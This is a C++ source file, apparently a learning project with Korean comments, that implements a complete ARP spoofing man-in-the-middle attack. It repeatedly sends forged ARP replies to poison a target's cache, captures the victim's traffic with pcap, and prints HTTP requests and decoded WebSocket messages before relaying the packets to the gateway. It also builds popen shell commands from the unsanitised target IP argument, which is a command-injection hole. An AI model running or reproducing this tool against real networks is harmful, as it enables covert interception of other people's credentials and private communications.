#include <assert.h>
#include <net/ethernet.h>
#include <pcap.h>
#include <signal.h>
#include <stdlib.h>
#include <zlib.h>

#include <cstdio>
#include <cstring>
#include <iostream>
#include <string>
#include <vector>
#include <thread>

using namespace std;

int check_protocol(const u_char *payload, const u_int payload_len);
int unmask_data(u_char *buf, const u_int buf_len);
int decompress_data(u_char *source, int src_len, u_char *result, int &result_len);
string get_mac(const char *net_interface, string IP);
void find_me(char *dev_name, string &my_mac, string &my_ip);
int cure_arp_table();
int infect_arp_table();
void init_addresses(const string &my_ip, const string &my_mac, const string &target_ip, const string &target_mac, const string &gateway_ip, const string &gateway_mac);
void parse_ip(u_char *dest_ip, string ip);
void parse_mac(u_char *dest_mac, string mac);
void infect_thread();
int send_packet(u_char *packet, u_int packet_size, const u_char *mac_addr);

typedef unsigned char u_char;

#define HTTP 1
#define WEB_SOCKET 2
#define CHUNK 16384
#define SNAP_LEN 1518

u_char MY_MAC[6];
u_char TARGET_MAC[6];
u_char GATEWAY_MAC[6];
u_char MY_IP[4];
u_char TARGET_IP[4];
u_char GATEWAY_IP[4];

char NET_INTERFACE[5];
string VICTIM_IP_FILTER = "ip src ";  // private ip address
pcap_t *handle;

bool stop_job = false;

void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void sig_handler(int sig);

int main(int argc, char *argv[]) {
    // argv의 형식이 다르면 helper 출력
    if (argc < 2) {
        cout << "\nUsage:\n ./arp_spoofing [target IP] [gateway IP]\n" << endl;
        exit(1);
    }

    string my_mac = "";
    string my_ip = "";
    string target_mac = "";
    string target_ip = "";
    string gateway_mac = "";
    string gateway_ip = "";

    target_ip =  argv[1];
    gateway_ip = argv[2];

    VICTIM_IP_FILTER += target_ip;
    // arp 감염이 되어있다고 가정
    // 패킷을 받은 것을 relay해주는 기능 먼저 개발

    pcap_if_t *alldevs;
    pcap_if_t *dev;

    char error_buf[PCAP_ERRBUF_SIZE];
    // pcap_t *handle;
    const u_char *packet;
    struct pcap_pkthdr packet_header;
    int packet_cout_limit = 1;
    int timeout_limit = 1000;
    int total_packet_count = 0;

    bpf_u_int32 subnet_mask, ip;

    // filter
    struct bpf_program filter;

    // find device
    if (pcap_findalldevs(&alldevs, error_buf) < 0) {
        printf("no device found.. \n");
        return 0;
    }

    int i = 1;
    for (dev = alldevs; dev; dev = dev->next) {
        printf("[%d] device found : %s \n", i++, dev->name);
    }

    string selected_device;
    cout << "----------------\nselect network device(type name) : ";
    cin >> selected_device;

    strcpy(NET_INTERFACE, selected_device.c_str());

    target_mac = get_mac(NET_INTERFACE, target_ip).c_str();
    gateway_mac = get_mac(NET_INTERFACE, gateway_ip).c_str();
    cout << "target mac address : " << target_mac << endl;
    cout << "gateway mac address : " << gateway_mac << endl;
    find_me(NET_INTERFACE, my_mac, my_ip);

    init_addresses(my_ip, my_mac, target_ip, target_mac, gateway_ip, gateway_mac);

    handle = pcap_open_live(NET_INTERFACE, BUFSIZ, packet_cout_limit, timeout_limit, error_buf);

    if (handle == NULL) {
        printf("error on pcap_open_live : %s \n", error_buf);
    }

    if (pcap_compile(handle, &filter, VICTIM_IP_FILTER.c_str(), 0, ip) == -1) {
        printf("Bad filter.. \n");
        return 2;
    }

    if (pcap_setfilter(handle, &filter) == -1) {
        printf("error setting filter.. \n");
        return 2;
    }

    // sig handler 등록
    signal(SIGINT, sig_handler);

    // arp 감염 쓰레드
    thread t1(infect_thread);
    t1.detach();

    // handler 등록하고 패킷 캡쳐 시작
    pcap_loop(handle, total_packet_count, pkt_handler, NULL);
    pcap_close(handle);
}

// handle event when packet sent by victim is captured
void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ether_header *eth_header;
    eth_header = (struct ether_header *)packet;
    if (ntohs(eth_header->ether_type) != ETHERTYPE_IP) {
        // skip
        return;
    }

    const u_char *ip_header;
    const u_char *tcp_header;
    const u_char *payload;

    const int ethernet_header_length = 14;
    int ip_header_length;
    int tcp_header_length;
    int payload_length;

    ip_header = packet + ethernet_header_length;
    ip_header_length = ((*ip_header) & 0x0F);
    ip_header_length = ip_header_length * 4;
    // printf("IP header length (IHL) in bytes : %d\n", ip_header_length);

    u_char protocol = *(ip_header + 9);
    if (protocol != IPPROTO_TCP) {
        // printf("Not a TCP packet. Skipping...\n");
        // return;
    }

    tcp_header = packet + ethernet_header_length + ip_header_length;

    tcp_header_length = ((*(tcp_header + 12)) & 0xF0) >> 4;

    tcp_header_length = tcp_header_length * 4;

    int total_headers_size = ethernet_header_length + ip_header_length + tcp_header_length;

    payload_length = header->caplen - (total_headers_size);
    payload = packet + total_headers_size;

    // packet 내용 출력
    int protocol_type = check_protocol(payload, payload_length);
    if (protocol_type == HTTP) {
        const u_char *data_p = packet + total_headers_size;
        printf("--------new packet -----------\n");
        for (int i = 0; i < payload_length; i++) {
            printf("%c", *data_p);
            data_p++;
        }
        printf("\n");
    }
    else if (protocol_type == WEB_SOCKET) {
        // unmask websocket data
        u_char unmasked[payload_length];
        memcpy(unmasked, payload, payload_length);
        unmask_data(unmasked, payload_length);

        // decompress websocket payload
        u_char compr_payload[payload_length + 6];
        u_char decompr_payload[payload_length + 6];
        int decomp_len = 0;
        memcpy(compr_payload, unmasked + 6, payload_length);
        compr_payload[0] = compr_payload[0] + 1;
        compr_payload[payload_length] = 0x00;
        compr_payload[payload_length + 1] = 0x00;
        compr_payload[payload_length + 2] = 0xff;
        compr_payload[payload_length + 3] = 0xff;
        compr_payload[payload_length + 4] = 0xff;
        compr_payload[payload_length + 5] = 0xff;

        decompress_data(compr_payload, payload_length + 6, decompr_payload, decomp_len);

        const u_char *data_p = packet + total_headers_size;
        printf("--------new packet -----------\n");
        printf("암호화된 패킷 : \n");
        for (int i = 0; i < payload_length; i++) {
            printf("%c", *data_p);
            data_p++;
        }
        printf("\n복호화된 패킷 : \n");
        for (int i = 0; i < decomp_len; i++) {
            printf("%c", decompr_payload[i]);
        }
        printf("\n");
    }
    else {
        //출력하지 않고 forwarding만 해줌
    }

    u_int packet_size = header->caplen;
    u_char buf[packet_size + 1];
    memcpy((void *)buf, packet, packet_size);

    // gateway로 패킷 전송
    int result = send_packet(buf, packet_size, GATEWAY_MAC);
    if(result == -1) {
        // packet 전송 실패
        // printf("sending packet failed..\n");
    }
    else {
        // printf("packet sent to %x.%x.%x.%x.%x.%x : %d \n", *buf, *(buf+1), *(buf+2), *(buf+3), *(buf+4), *(buf+5), result);
    }
}

// sigint시 종료해야 하는 작업들 처리
void sig_handler(int sig) {
    stop_job = true;
    for(int i = 0 ; i < 7 ; i ++) {
        printf("[%d]감염시킨 arp table 복구하는 중.. \n", i);
        cure_arp_table();
        sleep(1);
    }
    printf("good bye..\n");
    pcap_close(handle);
    exit(0);
}

void init_addresses(const string &my_ip, const string &my_mac, const string &target_ip, const string &target_mac, const string &gateway_ip, const string &gateway_mac) {
    parse_ip(MY_IP, my_ip);
    parse_ip(TARGET_IP, target_ip);
    parse_ip(GATEWAY_IP, gateway_ip);
    parse_mac(MY_MAC, my_mac);
    parse_mac(TARGET_MAC, target_mac);
    parse_mac(GATEWAY_MAC, gateway_mac);
}

void parse_ip(u_char *dest_ip, string ip) {
    int idx = 0;
    for(int i = 0 ; i < ip.length() ; i ++) {
        if(ip[i] == '.'){
            idx ++;
            continue;
        } 
        if(!((ip[i] >= '0') && (ip[i] <= '9'))) continue;
        dest_ip[idx] = dest_ip[idx] * 10 + (ip[i] - '0');
    }
}

void parse_mac(u_char *dest_mac, string mac){
    int idx = 0;
    for(int i = 0 ; i < mac.length() ; i ++) {
        if(mac[i] == ':'){
            idx ++;
            continue;
        } 
        if(!((mac[i] >= '0') && (mac[i] <= '9') || ((mac[i] >= 'a') && (mac[i] <= 'f')))) continue;
        if(mac[i] >= 'a'){
            dest_mac[idx] = dest_mac[idx] * 16 + (mac[i] - 87);
        }
        else {
            dest_mac[idx] = dest_mac[idx] * 16 + (mac[i] - '0');
        }
    }
}

int send_packet(u_char *packet, u_int packet_size, const u_char *mac_addr) {
    // mac주소 변경
    memcpy((void *)packet, GATEWAY_MAC, 6);
    memcpy((void *)(packet + 6), MY_MAC, 6);

    // send packet
    return pcap_inject(handle, packet, packet_size);
}

int check_protocol(const u_char *payload, const u_int payload_len) {
    if (!strncmp((char *)payload, "GET", 3)) {
        // check GET
        return HTTP;
    }
    if (!strncmp((char *)payload, "POST", 4)) {
        // check POST
        return HTTP;
    }
    if ((payload[0] & 0xff) == 0xc1) {
        // check websocket
        return WEB_SOCKET;
    }
    return false;
}

int decompress_data(u_char *source, int src_len, u_char *result, int &result_len) {
    int ret;
    unsigned have;
    z_stream z_strm;
    unsigned char in[CHUNK];
    unsigned char out[CHUNK];

    /* allocate inflate state */
    z_strm.zalloc = Z_NULL;
    z_strm.zfree = Z_NULL;
    z_strm.opaque = Z_NULL;
    z_strm.avail_in = 0;
    z_strm.next_in = Z_NULL;
    ret = inflateInit2(&z_strm, -15);
    if (ret != Z_OK) return ret;

    /* decompress until deflate stream ends or end of file */
    u_char *decompr_payload = NULL;
    u_int decompr_len = 0;
    u_int compr_len, decompr_buf_len;
    u_char *compr_payload, *decompr_buf;
    u_int err;

    compr_len = src_len;
    compr_payload = (u_char *)malloc(sizeof(u_char) * compr_len);
    memcpy(compr_payload, source, compr_len);
    decompr_buf_len = 2 * compr_len;
    decompr_buf = (u_char *)malloc(sizeof(u_char) * decompr_buf_len);

    z_strm.next_in = compr_payload;
    z_strm.avail_in = compr_len;
    /* Decompress all available data. */
    do {
        z_strm.next_out = decompr_buf;
        z_strm.avail_out = decompr_buf_len;

        err = inflate(&z_strm, Z_SYNC_FLUSH);

        if (err == Z_OK || err == Z_STREAM_END || err == Z_BUF_ERROR) {
            u_int avail_bytes = decompr_buf_len - z_strm.avail_out;
            if (avail_bytes) {
                decompr_payload = (u_char *)realloc(decompr_payload, decompr_len + avail_bytes);
                memcpy(&decompr_payload[decompr_len], decompr_buf, avail_bytes);
                decompr_len += avail_bytes;
            }
        }
    } while (err == Z_OK);

    memcpy(result, decompr_payload, decompr_len);
    result_len = decompr_len;

    /* clean up and return */
    (void)inflateEnd(&z_strm);
    return ret == Z_STREAM_END ? Z_OK : Z_DATA_ERROR;
}

/* report a zlib or i/o error */
void zerr(int ret) {
    fputs("zpipe: ", stderr);
    switch (ret) {
        case Z_ERRNO:
            if (ferror(stdin)) fputs("error reading stdin\n", stderr);
            if (ferror(stdout)) fputs("error writing stdout\n", stderr);
            break;
        case Z_STREAM_ERROR:
            fputs("invalid compression level\n", stderr);
            break;
        case Z_DATA_ERROR:
            fputs("invalid or incomplete deflate data\n", stderr);
            break;
        case Z_MEM_ERROR:
            fputs("out of memory\n", stderr);
            break;
        case Z_VERSION_ERROR:
            fputs("zlib version mismatch!\n", stderr);
    }
}

int unmask_data(u_char *buf, const u_int buf_len) {
    u_char payload_length = *(buf + 1) & 0x7f;
    u_char mask[4];
    int payload_start;

    if (payload_length < 126) {
        for (int i = 0; i < 4; i++) {
            mask[i] = *(buf + i + 2);
        }
        payload_start = 6;
    } else if (payload_length == 126) {
        printf("길이 너무 김..\n");
        return -1;
    } else {
        printf("길이 너무 김..\n");
        return -1;
    }

    // unmask payload
    for (int i = 0; i < payload_length; i++) {
        buf[i + payload_start] = buf[i + payload_start] ^ mask[i % 4];
    }

    return 1;
}

string get_mac(const char *net_interface, string IP) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(net_interface, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        cout << "Error opening interface: " << errbuf << endl;
        exit(1);
    }
    struct pcap_pkthdr header;
    const u_char *packet;
    string macAddress;
    string command = "arping -c 1 " + IP + " | grep from | awk '{print $4}'";
    FILE *stream = popen(command.c_str(), "r");
    if (stream) {
        char buffer[1024];
        while (!feof(stream)) {
            if (fgets(buffer, sizeof(buffer), stream) != NULL) {
                macAddress += buffer;
            }
        }
        pclose(stream);
    }
    return macAddress;
}

// 내 IP주소와 MAC주소 찾기
void find_me(char *dev_name, string &my_mac, string &my_ip) {
    FILE *ptr;

    char cmd[300] = {0x0};
    char mac[20] = {0};
    char ip[20] = {0};

    // MY_MAC FIND
    sprintf(cmd, "ifconfig %s | grep ether | awk '{print $2}'", dev_name);
    ptr = popen(cmd, "r");
    fgets(mac, sizeof(mac), ptr);
    pclose(ptr);
    string str(mac);
    my_mac = str;
    cout << "my mac : " << my_mac << endl;

    // MY_IP FIND
    sprintf(cmd, "ifconfig %s | grep 'inet ' | awk '{print $2}'", dev_name);
    ptr = popen(cmd, "r");
    fgets(ip, sizeof(ip), ptr);
    pclose(ptr);
    string myip(ip);
    my_ip = myip;
    cout << "my IP : " << my_ip << endl;
}


int infect_arp_table() {
    // arp reply
    u_char packet[42] = {0};

    memcpy(packet, TARGET_MAC, 6);
    memcpy(packet + 6, MY_MAC, 6);
    //type : arp
    packet[12] = 0x08;
    packet[13] = 0x06;
    //hardware type : 항상 1
    packet[15] = 0x01;
    //protocol type : ipv4는 8
    packet[16] = 0x08;
    //hardware address length : 이더넷 상은 6
    packet[18] = 0x06;
    //protocol address length : ipv4는 4
    packet[19] = 0x04;
    //opcode
    packet[21] = 0x02;

    memcpy(packet + 22, MY_MAC, 6);
    memcpy(packet + 28, GATEWAY_IP, 4);
    memcpy(packet + 32, TARGET_MAC, 6);
    memcpy(packet + 38, TARGET_IP, 4);
    return pcap_inject(handle, packet, 42); 
}

int cure_arp_table() {
    // arp reply
    u_char packet[42] = {0};

    memcpy(packet, TARGET_MAC, 6);
    memcpy(packet + 6, MY_MAC, 6);
    //type : arp
    packet[12] = 0x08;
    packet[13] = 0x06;
    //hardware type : 항상 1
    packet[15] = 0x01;
    //protocol type : ipv4는 8
    packet[16] = 0x08;
    //hardware address length : 이더넷 상은 6
    packet[18] = 0x06;
    //protocol address length : ipv4는 4
    packet[19] = 0x04;
    //opcode
    packet[21] = 0x02;

    memcpy(packet + 22, GATEWAY_MAC, 6);
    memcpy(packet + 28, GATEWAY_IP, 4);
    memcpy(packet + 32, TARGET_MAC, 6);
    memcpy(packet + 38, TARGET_IP, 4);
    return pcap_inject(handle, packet, 42); 
}

void infect_thread() {
    while(stop_job == false) {
        infect_arp_table();
        sleep(2);
    }
}